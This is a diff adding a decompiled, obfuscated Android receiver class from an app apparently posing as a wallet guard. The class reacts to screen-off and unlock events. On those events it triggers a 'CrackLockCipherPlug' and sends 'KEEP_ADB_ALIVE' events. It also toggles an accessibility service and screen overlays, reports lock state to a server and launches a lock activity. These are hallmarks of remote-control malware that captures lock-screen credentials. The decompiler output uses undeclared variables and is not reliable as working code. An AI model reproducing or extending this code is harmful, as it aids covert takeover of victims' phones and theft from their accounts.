@@ -1,0 +1,423 @@
+package com.guard.wallet.receiver;
+
+import com.guard.wallet.core.AppUtils;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.util.Log;
+import com.guard.wallet.LockActivity;
+import com.guard.wallet.MainApplication;
+import com.guard.wallet.helper.ListenWindowHelper;
+import com.guard.wallet.helper.OverlayViewHelper;
+import com.guard.wallet.helper.r;
+import com.guard.wallet.http.l;
+import com.guard.wallet.plug.c;
+import com.guard.wallet.req.ReqListenHelper;
+import com.guard.wallet.service.MyAccessibilityService;
+import com.guard.wallet.utils.SystemHelper;
+import com.guard.wallet.utils.SharedPrefsManager;
+import com.guard.wallet.utils.SnowflakeIdGenerator;
+import java.util.Objects;
+import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
+
+public class ScreenBroadcastReceiver extends BroadcastReceiver {
+   public static final SnowflakeIdGenerator b = new SnowflakeIdGenerator(1L);
+   public final AtomicInteger a = new AtomicInteger(1);
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public static void a(int var0) {
+      Exception var10000;
+      label50: {
+         try {
+            String var4 = SharedPrefsManager.l("lockSubscribeId");
+            if (!q.B(var4)) {
+               ReqListenHelper var3 = new ReqListenHelper(var4, var0);
+               l.h(var3);
+               SharedPrefsManager.w("lockSubscribeId");
+            }
+         } catch (Exception var8) {
+            var10000 = var8;
+            boolean var10001 = false;
+            break label50;
+         }
+
+         boolean var1;
+         try {
+            var1 = r.k();
+         } catch (Exception var7) {
+            var10000 = var7;
+            boolean var12 = false;
+            break label50;
+         }
+
+         boolean var2 = true;
+         if (var1) {
+            if (var0 == 4) {
+               var1 = true;
+            } else {
+               var1 = false;
+            }
+
+            try {
+               r.g(var1);
+            } catch (Exception var6) {
+               var10000 = var6;
+               boolean var13 = false;
+               break label50;
+            }
+         }
+
+         if (var0 == 4) {
+            var1 = var2;
+         } else {
+            var1 = false;
+         }
+
+         try {
+            OverlayViewHelper.f(null, var1);
+            return;
+         } catch (Exception var5) {
+            var10000 = var5;
+            boolean var14 = false;
+         }
+      }
+
+      Exception var11 = var10000;
+      q.s("ScreenBroadcastReceiver", var11);
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void onReceive(Context var1, Intent var2) {
+      Exception var10000;
+      label230: {
+         try {
+            var28 = this.a;
+         } catch (Exception var27) {
+            var10000 = var27;
+            boolean var10001 = false;
+            break label230;
+         }
+
+         byte var4 = 1;
+
+         try {
+            var28.set(1);
+         } catch (Exception var26) {
+            var10000 = var26;
+            boolean var33 = false;
+            break label230;
+         }
+
+         if (var2 == null) {
+            return;
+         }
+
+         byte var3;
+         label218: {
+            label217: {
+               label216: {
+                  label215: {
+                     label214: {
+                        label231: {
+                           label212: {
+                              label211: {
+                                 label210: {
+                                    label209: {
+                                       try {
+                                          if (q.B(var2.getAction())) {
+                                             return;
+                                          }
+
+                                          var29 = var2.getAction();
+                                          switch (var29.hashCode()) {
+                                             case -2128145023:
+                                                break label212;
+                                             case -1454123155:
+                                                break;
+                                             case 244891622:
+                                                break label209;
+                                             case 257757490:
+                                                break label210;
+                                             case 823795052:
+                                                break label211;
+                                             default:
+                                                break label231;
+                                          }
+                                       } catch (Exception var25) {
+                                          var10000 = var25;
+                                          boolean var34 = false;
+                                          break label230;
+                                       }
+
+                                       try {
+                                          if (var29.equals("android.intent.action.SCREEN_ON")) {
+                                             break label214;
+                                          }
+                                          break label231;
+                                       } catch (Exception var24) {
+                                          var10000 = var24;
+                                          boolean var38 = false;
+                                          break label230;
+                                       }
+                                    }
+
+                                    try {
+                                       if (var29.equals("android.intent.action.DREAMING_STARTED")) {
+                                          break label215;
+                                       }
+                                       break label231;
+                                    } catch (Exception var23) {
+                                       var10000 = var23;
+                                       boolean var37 = false;
+                                       break label230;
+                                    }
+                                 }
+
+                                 try {
+                                    if (var29.equals("android.intent.action.DREAMING_STOPPED")) {
+                                       break label216;
+                                    }
+                                    break label231;
+                                 } catch (Exception var22) {
+                                    var10000 = var22;
+                                    boolean var36 = false;
+                                    break label230;
+                                 }
+                              }
+
+                              try {
+                                 if (var29.equals("android.intent.action.USER_PRESENT")) {
+                                    break label217;
+                                 }
+                                 break label231;
+                              } catch (Exception var21) {
+                                 var10000 = var21;
+                                 boolean var35 = false;
+                                 break label230;
+                              }
+                           }
+
+                           boolean var5;
+                           try {
+                              var5 = var29.equals("android.intent.action.SCREEN_OFF");
+                           } catch (Exception var20) {
+                              var10000 = var20;
+                              boolean var39 = false;
+                              break label230;
+                           }
+
+                           if (var5) {
+                              var3 = 0;
+                              break label218;
+                           }
+                        }
+
+                        var3 = -1;
+                        break label218;
+                     }
+
+                     var3 = 1;
+                     break label218;
+                  }
+
+                  var3 = 2;
+                  break label218;
+               }
+
+               var3 = 3;
+               break label218;
+            }
+
+            var3 = 4;
+         }
+
+         if (var3 != 0) {
+            if (var3 != 1) {
+               if (var3 != 2) {
+                  if (var3 != 3) {
+                     if (var3 != 4) {
+                        var3 = -1;
+                     } else {
+                        label233: {
+                           try {
+                              Log.d("ScreenBroadcastReceiver", "手机解锁了");
+                              if (MainApplication.getInstance() == null) {
+                                 break label233;
+                              }
+
+                              if (!MainApplication.getInstance().isUserUnlockedInstance()) {
+                                 MainApplication.getInstance().unlockedInstance();
+                              }
+                           } catch (Exception var18) {
+                              var10000 = var18;
+                              boolean var40 = false;
+                              break label230;
+                           }
+
+                           try {
+                              if (MainApplication.getInstance().getCrackLockCipherPlug() != null) {
+                                 MainApplication.getInstance().getCrackLockCipherPlug().getClass();
+                                 c.g();
+                              }
+                           } catch (Exception var19) {
+                              var10000 = var19;
+                              boolean var41 = false;
+                              break label230;
+                           }
+
+                           try {
+                              MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
+                           } catch (Exception var12) {
+                              var10000 = var12;
+                              boolean var42 = false;
+                              break label230;
+                           }
+                        }
+
+                        try {
+                           a(4);
+                           AtomicBoolean var30 = MyAccessibilityService.q;
+                           if (var30.get()) {
+                              var30.set(false);
+                              SystemHelper.F0(2);
+                           }
+                        } catch (Exception var17) {
+                           var10000 = var17;
+                           boolean var43 = false;
+                           break label230;
+                        }
+
+                        var3 = 4;
+                     }
+                  } else {
+                     try {
+                        Log.d("ScreenBroadcastReceiver", "手机停止屏保、退出休眠");
+                     } catch (Exception var11) {
+                        var10000 = var11;
+                        boolean var44 = false;
+                        break label230;
+                     }
+
+                     var3 = 3;
+                  }
+               } else {
+                  try {
+                     Log.d("ScreenBroadcastReceiver", "手机开启屏保、进入休眠");
+                  } catch (Exception var10) {
+                     var10000 = var10;
+                     boolean var45 = false;
+                     break label230;
+                  }
+
+                  var3 = 2;
+               }
+            } else {
+               label234: {
+                  try {
+                     Log.d("ScreenBroadcastReceiver", "手机亮屏了");
+                     if (MainApplication.getInstance() != null) {
+                        MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_ON");
+                     }
+                  } catch (Exception var16) {
+                     var10000 = var16;
+                     boolean var46 = false;
+                     break label230;
+                  }
+
+                  var3 = var4;
+
+                  try {
+                     if (!SystemHelper.p0()) {
+                        break label234;
+                     }
+
+                     SharedPrefsManager.D(b.nextId(), "lockBatchId");
+                  } catch (Exception var15) {
+                     var10000 = var15;
+                     boolean var47 = false;
+                     break label230;
+                  }
+
+                  var3 = var4;
+               }
+            }
+         } else {
+            label142: {
+               try {
+                  Log.d("ScreenBroadcastReceiver", "手机息屏了");
+                  a(0);
+                  if (MyAccessibilityService.P() == null) {
+                     break label142;
+                  }
+
+                  if (MyAccessibilityService.P().j()) {
+                     MyAccessibilityService.q.set(true);
+                     Log.d("ScreenBroadcastReceiver", "stopLocalAccessibilityDelegate");
+                     MyAccessibilityService.P().D();
+                  }
+               } catch (Exception var14) {
+                  var10000 = var14;
+                  boolean var48 = false;
+                  break label230;
+               }
+
+               try {
+                  MyAccessibilityService.P().H(true, false);
+               } catch (Exception var9) {
+                  var10000 = var9;
+                  boolean var49 = false;
+                  break label230;
+               }
+            }
+
+            try {
+               if (MainApplication.getInstance() != null) {
+                  MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_OFF");
+                  if (MainApplication.getInstance().getCrackLockCipherPlug() != null) {
+                     MainApplication.getInstance().getCrackLockCipherPlug().getClass();
+                     c.f();
+                  }
+               }
+            } catch (Exception var13) {
+               var10000 = var13;
+               boolean var50 = false;
+               break label230;
+            }
+
+            try {
+               ListenWindowHelper.a();
+               SharedPrefsManager.w("lockBatchId");
+            } catch (Exception var8) {
+               var10000 = var8;
+               boolean var51 = false;
+               break label230;
+            }
+
+            var3 = 0;
+         }
+
+         try {
+            if (!Objects.equals(0, Integer.valueOf(var3))) {
+               LockActivity.a();
+            }
+         } catch (Exception var7) {
+            var10000 = var7;
+            boolean var52 = false;
+            break label230;
+         }
+
+         try {
+            SharedPrefsManager.D(Integer.valueOf(var3), "screenState");
+            SharedPrefsManager.H(var3, var2.getAction());
+            return;
+         } catch (Exception var6) {
+            var10000 = var6;
+            boolean var53 = false;
+         }
+      }
+
+      Exception var31 = var10000;
+      q.s("ScreenBroadcastReceiver", var31);
+   }
+}
